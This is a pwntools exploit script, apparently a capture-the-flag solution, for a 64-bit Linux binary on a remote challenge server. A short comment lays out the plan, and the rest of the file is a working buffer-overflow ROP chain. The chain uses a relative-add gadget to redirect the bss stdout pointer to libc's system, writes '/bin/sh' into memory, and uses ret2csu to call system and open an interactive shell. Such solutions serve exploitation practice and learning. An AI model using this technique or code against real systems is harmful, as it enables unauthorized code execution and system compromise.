'''
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)

1. relative add gadget at `__do_global_dtors_aux` final 5 bytes (need to convert to data first then convert back to code in IDApro to see it)
2. `relative_add(libc.sym['system'] - libc.sym['_IO_2_1_stdout_'], bss_segment)` to hijack bss_segment.stdout to libc.system
3. write "/bin/sh\x00" to bss_segment + 0x40
4. ret2csu to call system("/bin/sh") | call [r15+rbx*8] with rdi=r12=binsh_addr
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "29114" 
filename = "./pwn"
elf = ELF(filename)
local_libc = "/home/fa1c4/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6"
remote_libc = "./libc-2.31.so"
libc = ELF(local_libc if local else remote_libc)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)

ret_addr = 0x000000000040101a
pop_rdi_ret_addr = 0x0000000000401253
pop_rsi_r15_ret_addr = 0x0000000000401251
pop_rbx_rbp_r12_r13_r14_r15_ret_addr = 0x000000000040124A
add_rbp_3D_ebx_ret_addr = 0x000000000040112C # add [rbp-3Dh], ebx; retn
mov_rdx_rsi_edi_call_addr = 0x0000000000401230
# main_addr = 0x00000000004011AB
buffer_overflow_size = 112 + 8
bss_segment_addr = 0x0000000000404020
buf_addr = bss_segment_addr + 0x40
libc_offset = libc.sym['system'] - libc.sym['_IO_2_1_stdout_']

def B():
    gdb.attach(io)
    pause()

# rdx<-r14, rsi<-r13, edi<-r12d, call [r15+rbx*8]
def ret2csu(r12, r13, r14, r15):
    ret2csu_payload = p64(pop_rbx_rbp_r12_r13_r14_r15_ret_addr)
    ret2csu_payload += p64(0) + p64(0xFFFFFFFF) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    ret2csu_payload += p64(mov_rdx_rsi_edi_call_addr)
    return ret2csu_payload

# addval should be positive integer
def add_rbp_3D_ebx(addval, target_addr):
    return flat([pop_rbx_rbp_r12_r13_r14_r15_ret_addr,
                addval, target_addr + 0x3D, 
                0, 0, 0, 0,
                add_rbp_3D_ebx_ret_addr])

def pwn():
    # log.info('type {} libc_offset: {}'.format(type(libc_offset), libc_offset))
    # hijack _IO_2_1_stdout_ to libc.system 
    payload = cyclic(buffer_overflow_size) + p64(ret_addr)
    payload += add_rbp_3D_ebx(libc_offset, bss_segment_addr)
    payload += add_rbp_3D_ebx(int.from_bytes(b'/bin', 'little'), buf_addr)
    payload += add_rbp_3D_ebx(int.from_bytes(b'/sh\x00', 'little'), buf_addr+0x4)
    payload += ret2csu(buf_addr, 0, 0, bss_segment_addr) # system("/bin/sh\x00")
    
    # log.info('payload length: {}'.format(len(payload))) # 376
    io.sendline(payload)
    

if __name__ == "__main__":
    pwn()
    io.interactive()
